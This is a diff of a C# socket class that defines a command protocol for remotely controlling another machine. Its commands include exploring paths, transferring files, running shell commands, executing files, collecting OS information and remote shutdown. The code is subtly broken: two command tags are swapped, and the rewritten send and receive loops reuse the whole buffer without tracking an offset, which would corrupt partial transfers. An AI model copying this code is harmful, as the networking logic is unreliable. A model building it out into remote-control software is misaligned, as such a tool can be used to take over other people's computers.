@@ -1,6 +1,6 @@
 ﻿using System.Net.Sockets;
 using System.Net;
-using System.Text;
+using System;
 
 namespace Shared
 {
@@ -18,23 +18,24 @@ namespace Shared
     }
     public class ManagementSocketConnection
     {
-        private static readonly IDictionary<SocketCommands, string> _listOfCommands = new Dictionary<SocketCommands, string>()
+        private static readonly IDictionary<SocketCommands, string> _listCommands = new Dictionary<SocketCommands, string>()
         {
-            {SocketCommands.NotifyMessage, "#NotifyMessage#" },
-            {SocketCommands.ExplorePath, "#ExplorePath#" },
-            {SocketCommands.UploadFile, "#NotifyMSG#" },
-            {SocketCommands.DownLoadFile, "#UploadFile#" },
-            {SocketCommands.NotifyShellCommand, "#NotifyShellCommand#" },
-            {SocketCommands.NotifyOSInformations, "#NotifyOSInformations#" },
-            {SocketCommands.RemoteShutdown, "#RemoteShutdown#" },
-            {SocketCommands.PingTarget, "#PingTarget#" },
-            {SocketCommands.ExecFile, "#ExecFile#" }
+            {SocketCommands.NotifyMessage, "<NotifyMessage>" },
+            {SocketCommands.ExplorePath, "<ExplorePath>" },
+            {SocketCommands.UploadFile, "<NotifyMSG>" },
+            {SocketCommands.DownLoadFile, "<UploadFile>" },
+            {SocketCommands.NotifyShellCommand, "<NotifyShellCommand>" },
+            {SocketCommands.NotifyOSInformations, "<NotifyOSInformations>" },
+            {SocketCommands.RemoteShutdown, "<RemoteShutdown>" },
+            {SocketCommands.PingTarget, "<PingTarget>" },
+            {SocketCommands.ExecFile, "<ExecFile>" }
         };
-        public static string SocketCommand(SocketCommands SocketCommand) => _listOfCommands[SocketCommand];
+
+        public static string SocketCommand(SocketCommands SocketCommand) => _listCommands[SocketCommand];
 
         public ManagementSocketConnection() { }
 
-        public Task ConnectionPoolingAsync(
+        public static Task ConnectionPoolingAsync(
             Socket webSocket,
             IPEndPoint endpoint,
             IProgress<Socket> notifyConnection,
@@ -54,13 +55,13 @@ namespace Shared
                             notifyConnection.Report(webSocket);
                         }
                     }
-                    catch (Exception) { }
+                    catch { }
                 }
 
             }, cancellationToken);
         }
 
-        public Task ConnectionListenerAsync(
+        public static Task ConnectionListenerAsync(
             Socket webSocket,
             IPEndPoint endpoint,
             IProgress<Socket> notifyConnection,
@@ -73,9 +74,10 @@ namespace Shared
 
                 while (true)
                 {
+                    cancellationToken.ThrowIfCancellationRequested();
+
                     try
                     {
-                        cancellationToken.ThrowIfCancellationRequested();
                         Socket client = await webSocket.AcceptAsync(cancellationToken);
                         notifyConnection.Report(client);
                     }
@@ -89,43 +91,52 @@ namespace Shared
             }, cancellationToken);
         }
 
-        public Task SocketReaderAsync(
+        public static Task<byte[]> SocketReaderAsync(
             Socket webSocket,
-            IProgress<string> notifyMessage,
-            CancellationToken cancellationToken)
+            CancellationToken cancellationToken,
+            IProgress<long>? notifyProgress = null)
         {
             return Task.Run(async () =>
             {
-                while (webSocket.Connected)
+                long received = 0;
+
+                byte[] buffer = new byte[webSocket.Available];
+
+                while (received < buffer.LongLength)
                 {
                     cancellationToken.ThrowIfCancellationRequested();
-
-                    if (webSocket.Available > uint.MinValue)
-                    {
-                        byte[] buffer = new byte[webSocket.Available];
-                        int received = await webSocket.ReceiveAsync(buffer, SocketFlags.None);
-                        string response = Encoding.UTF8.GetString(buffer, 0, received);
-
-                        notifyMessage.Report(response);
-                    }
-
+                    received += await webSocket.ReceiveAsync(buffer, SocketFlags.None, cancellationToken);
+                    notifyProgress?.Report(received);
                 }
+
+                return buffer;
+
             }, cancellationToken);
         }
 
-        public Task SocketWriterAsync(
+        public static Task SocketWriterAsync(
             Socket webSocket,
-            string message,
-            CancellationToken cancellationToken)
+            byte[] buffer,
+            CancellationToken cancellationToken,
+            IProgress<long>? notifyProgress = null)
         {
             return Task.Run(async () =>
             {
-                cancellationToken.ThrowIfCancellationRequested();
+                long sent = 0;
 
-                byte[] bytes = Encoding.UTF8.GetBytes(message);
-                int sent = await webSocket.SendAsync(bytes, SocketFlags.None);
+                while (sent < buffer.LongLength)
+                {
+                    cancellationToken.ThrowIfCancellationRequested();
+                    sent += await webSocket.SendAsync(buffer, SocketFlags.None, cancellationToken);
+                    notifyProgress?.Report(sent);
+                }
 
             }, cancellationToken);
+        }
+
+        public static bool StreamAvaliable(Socket socket)
+        {
+            return socket.Available > uint.MinValue;
         }
     }
 }
